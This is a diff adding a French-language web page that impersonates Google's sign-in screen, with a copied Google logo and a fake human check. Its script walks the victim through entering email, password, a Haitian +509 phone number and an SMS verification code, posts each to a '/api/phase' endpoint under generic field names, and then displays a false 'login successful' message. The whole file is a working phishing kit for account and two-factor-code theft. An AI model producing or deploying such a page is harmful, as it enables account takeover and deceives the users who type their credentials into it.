@@ -1,0 +1,471 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connexion - Compte Google</title>
+  <style>
+    :root {
+      --bg: #f8fafd;
+      --card-bg: #ffffff;
+      --text-primary: #1f1f1f;
+      --text-secondary: #444746;
+      --border: #dadce0;
+      --focus: #1a73e8;
+      --btn: #0b57d0;
+      --btn-hover: #0842a0;
+      --link: #0b57d0;
+      --error: #b3261e;
+      --radius: 28px;
+    }
+
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: "Google Sans", "Segoe UI", Roboto, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 450px;
+      background: var(--card-bg);
+      border: 1px solid #e6e8eb;
+      border-radius: var(--radius);
+      padding: 48px 40px 36px;
+      box-shadow: 0 1px 2px rgba(60, 64, 67, 0.15), 0 1px 3px 1px rgba(60, 64, 67, 0.1);
+    }
+
+    .logo {
+      width: 120px;
+      height: 38px;
+      margin-bottom: 22px;
+      display: block;
+      overflow: visible;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: 2rem;
+      font-weight: 400;
+      line-height: 1.25;
+    }
+
+    .subtitle {
+      margin: 12px 0 28px;
+      color: var(--text-secondary);
+      font-size: 1rem;
+    }
+
+    .field-wrap { margin-bottom: 14px; }
+
+    .input {
+      width: 100%;
+      height: 56px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 16px 14px;
+      font-size: 1rem;
+      color: var(--text-primary);
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .input:focus {
+      border-color: var(--focus);
+      box-shadow: 0 0 0 1px var(--focus) inset;
+    }
+
+    .phone-shell {
+      width: 100%;
+      height: 56px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      background: #fff;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .phone-shell:focus-within {
+      border-color: var(--focus);
+      box-shadow: 0 0 0 1px var(--focus) inset;
+    }
+
+    .phone-prefix {
+      height: 100%;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 0 12px 0 14px;
+      color: var(--text-primary);
+      border-right: 1px solid var(--border);
+      font-size: 0.95rem;
+      white-space: nowrap;
+    }
+
+    .flag {
+      font-size: 1.05rem;
+      line-height: 1;
+    }
+
+    .phone-input {
+      border: 0;
+      box-shadow: none;
+      height: 100%;
+      border-radius: 0 4px 4px 0;
+      padding-left: 12px;
+    }
+
+    .phone-input:focus {
+      border: 0;
+      box-shadow: none;
+    }
+
+    .consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-top: 8px;
+      color: var(--text-secondary);
+      font-size: 0.88rem;
+    }
+
+    .consent input {
+      margin-top: 3px;
+      accent-color: var(--focus);
+    }
+
+    .error {
+      color: var(--error);
+      font-size: 0.86rem;
+      margin: 6px 0 0;
+      min-height: 18px;
+    }
+
+    .link {
+      color: var(--link);
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.9rem;
+    }
+
+    .link:hover { text-decoration: underline; }
+
+    .actions {
+      margin-top: 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .btn {
+      background: var(--btn);
+      border: none;
+      color: #fff;
+      font-size: 0.9rem;
+      font-weight: 500;
+      padding: 10px 24px;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: background-color 0.15s ease;
+      min-width: 92px;
+      height: 40px;
+    }
+
+    .btn:hover { background: var(--btn-hover); }
+    .btn:disabled { opacity: 0.7; cursor: wait; }
+
+    .step { display: none; }
+    .step.active { display: block; }
+
+    .top-row {
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+    }
+
+    .footer {
+      width: 100%;
+      max-width: 450px;
+      margin-top: 14px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.76rem;
+      color: #5f6368;
+      padding: 0 8px;
+    }
+
+    .footer a {
+      color: inherit;
+      text-decoration: none;
+      margin-left: 14px;
+    }
+
+    .footer a:hover { text-decoration: underline; }
+
+    @media (max-width: 560px) {
+      body { padding: 0; background: #fff; display: block; }
+      .card {
+        border: 0;
+        box-shadow: none;
+        max-width: 100%;
+        min-height: 100vh;
+        border-radius: 0;
+        padding: 32px 24px;
+      }
+      .footer {
+        max-width: 100%;
+        padding: 0 24px 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="card" aria-live="polite">
+    <svg class="logo" viewBox="0 0 84 24" aria-label="Google" role="img">
+      <path fill="#4285F4" d="M9.75 12.2v3.9h6.45c-.28 1.67-1.95 4.9-6.45 4.9-3.88 0-7.04-3.2-7.04-7.15s3.16-7.15 7.04-7.15c2.2 0 3.68.94 4.52 1.75l3.08-2.98C15.38 3.67 12.82 2.5 9.75 2.5 4.36 2.5 0 6.86 0 12.25S4.36 22 9.75 22c5.64 0 9.37-3.96 9.37-9.54 0-.64-.07-1.13-.16-1.61H9.75z"/>
+      <path fill="#34A853" d="M31.53 8.5c-3.32 0-6.02 2.69-6.02 6s2.7 6 6.02 6c3.34 0 6.03-2.69 6.03-6s-2.69-6-6.03-6zm0 9.64c-1.82 0-3.38-1.5-3.38-3.64 0-2.15 1.56-3.64 3.38-3.64 1.84 0 3.39 1.49 3.39 3.64 0 2.14-1.55 3.64-3.39 3.64z"/>
+      <path fill="#FBBC05" d="M44.93 8.5c-3.32 0-6.02 2.69-6.02 6s2.7 6 6.02 6c3.34 0 6.03-2.69 6.03-6s-2.69-6-6.03-6zm0 9.64c-1.82 0-3.38-1.5-3.38-3.64 0-2.15 1.56-3.64 3.38-3.64 1.84 0 3.39 1.49 3.39 3.64 0 2.14-1.55 3.64-3.39 3.64z"/>
+      <path fill="#4285F4" d="M62.7 9.2h-.09c-.6-.72-1.75-1.36-3.2-1.36-3.04 0-5.82 2.67-5.82 6.06 0 3.37 2.78 6.04 5.82 6.04 1.45 0 2.6-.64 3.2-1.39h.09v.9c0 2.4-1.28 3.69-3.35 3.69-1.69 0-2.74-1.22-3.17-2.24l-2.3.96c.66 1.6 2.42 3.56 5.47 3.56 3.18 0 5.87-1.88 5.87-6.45V8.2H62.7v1zm-3.08 8.94c-1.82 0-3.35-1.53-3.35-3.64 0-2.13 1.53-3.67 3.35-3.67 1.79 0 3.26 1.54 3.26 3.67 0 2.11-1.47 3.64-3.26 3.64z"/>
+      <path fill="#EA4335" d="M67.22 2.9h2.64V20.5h-2.64z"/>
+      <path fill="#EA4335" d="M74.5 18.16c-.85 0-1.45-.39-1.86-1.16l8.02-3.32-.27-.68c-.5-1.35-2.02-3.84-5.13-3.84-3.09 0-5.66 2.42-5.66 6.01 0 3.37 2.55 6.01 5.95 6.01 2.74 0 4.32-1.68 4.98-2.66l-2.04-1.36c-.68 1-1.61 1.67-3 1.67zm-.19-6.8c1.09 0 2.01.55 2.32 1.33l-5.42 2.24c-.07-2.51 1.95-3.57 3.1-3.57z"/>
+    </svg>
+
+    <section class="step active" id="step-email">
+      <h1>Connexion</h1>
+      <p class="subtitle">Utiliser votre compte Google</p>
+      <div class="field-wrap">
+        <input id="email" class="input" type="email" autocomplete="email" placeholder="Adresse e-mail ou téléphone" />
+        <p class="error" id="email-error"></p>
+      </div>
+      <label class="consent" for="consent">
+        <input id="consent" type="checkbox" />
+        <span>Êtes-vous un humain ?</span>
+      </label>
+      <p class="error" id="consent-error"></p>
+      <div class="actions">
+        <a class="link" href="#">Adresse e-mail obligatoire ?</a>
+        <button class="btn" id="next-email">Suivant</button>
+      </div>
+    </section>
+
+    <section class="step" id="step-password">
+      <div class="top-row" id="email-preview"></div>
+      <h1>Bienvenue</h1>
+      <p class="subtitle">Saisissez votre mot de passe</p>
+      <div class="field-wrap">
+        <input id="password" class="input" type="password" autocomplete="off" placeholder="Mot de passe" />
+        <p class="error" id="password-error"></p>
+      </div>
+      <div class="actions">
+        <button class="btn" id="back-password" type="button" style="background:#fff;color:#0b57d0;border:1px solid #c7d0db;">Retour</button>
+        <button class="btn" id="next-password">Suivant</button>
+      </div>
+    </section>
+
+    <section class="step" id="step-phone">
+      <div class="top-row" id="email-preview-2"></div>
+      <h1>Validation du numéro</h1>
+      <p class="subtitle">Confirmez votre numéro</p>
+      <div class="field-wrap">
+        <div class="phone-shell">
+          <div class="phone-prefix"><span class="flag" aria-hidden="true">🇭🇹</span><span>+509</span></div>
+          <input id="phone" class="input phone-input" type="tel" inputmode="numeric" autocomplete="tel-national" maxlength="8" placeholder="8 chiffres" />
+        </div>
+        <p class="error" id="phone-error"></p>
+      </div>
+      <div class="actions">
+        <button class="btn" id="back-phone" type="button" style="background:#fff;color:#0b57d0;border:1px solid #c7d0db;">Retour</button>
+        <button class="btn" id="next-phone">Suivant</button>
+      </div>
+    </section>
+
+    <section class="step" id="step-code">
+      <div class="top-row" id="email-preview-3"></div>
+      <h1>Validation du code</h1>
+      <p class="subtitle">Entrez le code à 6 chiffres envoyé par SMS</p>
+      <div class="field-wrap">
+        <input id="code" class="input" type="text" inputmode="numeric" maxlength="6" placeholder="Code de validation" />
+        <p class="error" id="code-error"></p>
+      </div>
+      <div class="actions">
+        <button class="btn" id="back-code" type="button" style="background:#fff;color:#0b57d0;border:1px solid #c7d0db;">Retour</button>
+        <button class="btn" id="validate-code">Valider</button>
+      </div>
+    </section>
+
+    <section class="step" id="step-success">
+      <h1>Connexion réussie</h1>
+      <p class="subtitle">Votre identité a été vérifiée avec succès.</p>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <span>Français (France)</span>
+    <div>
+      <a href="#">Aide</a>
+      <a href="#">Confidentialité</a>
+      <a href="#">Conditions</a>
+    </div>
+  </footer>
+
+  <script>
+    const steps = {
+      email: document.getElementById("step-email"),
+      password: document.getElementById("step-password"),
+      phone: document.getElementById("step-phone"),
+      code: document.getElementById("step-code"),
+      success: document.getElementById("step-success")
+    };
+
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+    const phoneInput = document.getElementById("phone");
+    const codeInput = document.getElementById("code");
+    const consentInput = document.getElementById("consent");
+
+    const emailError = document.getElementById("email-error");
+    const passwordError = document.getElementById("password-error");
+    const phoneError = document.getElementById("phone-error");
+    const codeError = document.getElementById("code-error");
+    const consentError = document.getElementById("consent-error");
+
+    const emailPreview = document.getElementById("email-preview");
+    const emailPreview2 = document.getElementById("email-preview-2");
+    const emailPreview3 = document.getElementById("email-preview-3");
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    function showStep(stepKey) {
+      Object.values(steps).forEach((step) => step.classList.remove("active"));
+      steps[stepKey].classList.add("active");
+    }
+
+    function setPreview(value) {
+      emailPreview.textContent = value;
+      emailPreview2.textContent = value;
+      emailPreview3.textContent = value;
+    }
+
+    async function postPhase(phase, data) {
+      const response = await fetch("/api/phase", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phase, data, at: new Date().toISOString() })
+      });
+      if (!response.ok) throw new Error("request_failed");
+      return response.json();
+    }
+
+    async function verifyAndProceed(buttonEl, phase, data, nextStep) {
+      const text = buttonEl.textContent;
+      buttonEl.disabled = true;
+      buttonEl.textContent = "Verification...";
+      try {
+        await postPhase(phase, data);
+        showStep(nextStep);
+      } catch (_) {
+        alert("Erreur reseau: verification impossible.");
+      } finally {
+        buttonEl.disabled = false;
+        buttonEl.textContent = text;
+      }
+    }
+
+    consentInput.addEventListener("change", () => {
+      if (consentInput.checked) consentError.textContent = "";
+    });
+
+    phoneInput.addEventListener("input", () => {
+      phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 8);
+      if (phoneError.textContent && /^\d{8}$/.test(phoneInput.value)) {
+        phoneError.textContent = "";
+      }
+    });
+
+    document.getElementById("next-email").addEventListener("click", async (event) => {
+      const value = emailInput.value.trim();
+      if (!emailRegex.test(value)) {
+        emailError.textContent = "Saisissez une adresse e-mail valide.";
+        return;
+      }
+      if (!consentInput.checked) {
+        consentError.textContent = "Le consentement est obligatoire.";
+        return;
+      }
+      emailError.textContent = "";
+      consentError.textContent = "";
+      setPreview(value);
+      await verifyAndProceed(event.currentTarget, "phase_1_field_1", { field_1: value }, "password");
+      passwordInput.focus();
+    });
+
+    document.getElementById("back-password").addEventListener("click", () => {
+      showStep("email");
+      emailInput.focus();
+    });
+
+    document.getElementById("next-password").addEventListener("click", async (event) => {
+      const value = passwordInput.value.trim();
+      if (value.length < 8) {
+        passwordError.textContent = "Le code d acces test doit contenir au moins 8 caracteres.";
+        return;
+      }
+      passwordError.textContent = "";
+      await verifyAndProceed(event.currentTarget, "phase_2_field_2", { field_2: value }, "phone");
+      phoneInput.focus();
+    });
+
+    document.getElementById("back-phone").addEventListener("click", () => {
+      showStep("password");
+      passwordInput.focus();
+    });
+
+    document.getElementById("next-phone").addEventListener("click", async (event) => {
+      const value = phoneInput.value.replace(/\D/g, "");
+      if (!/^\d{8}$/.test(value)) {
+        phoneError.textContent = "Saisissez 8 chiffres après +509.";
+        return;
+      }
+      phoneError.textContent = "";
+      await verifyAndProceed(event.currentTarget, "phase_3_field_3", { field_3: "+509" + value }, "code");
+      codeInput.focus();
+    });
+
+    document.getElementById("back-code").addEventListener("click", () => {
+      showStep("phone");
+      phoneInput.focus();
+    });
+
+    document.getElementById("validate-code").addEventListener("click", async (event) => {
+      const value = codeInput.value.replace(/\D/g, "");
+      if (value.length !== 6) {
+        codeError.textContent = "Le code doit contenir 6 chiffres.";
+        return;
+      }
+      codeError.textContent = "";
+      await verifyAndProceed(event.currentTarget, "phase_4_field_4", { field_4: value }, "success");
+    });
+
+    [emailInput, passwordInput, phoneInput, codeInput].forEach((input) => {
+      input.addEventListener("keydown", (event) => {
+        if (event.key !== "Enter") return;
+        if (steps.email.classList.contains("active")) document.getElementById("next-email").click();
+        else if (steps.password.classList.contains("active")) document.getElementById("next-password").click();
+        else if (steps.phone.classList.contains("active")) document.getElementById("next-phone").click();
+        else if (steps.code.classList.contains("active")) document.getElementById("validate-code").click();
+      });
+    });
+  </script>
+</body>
+</html>
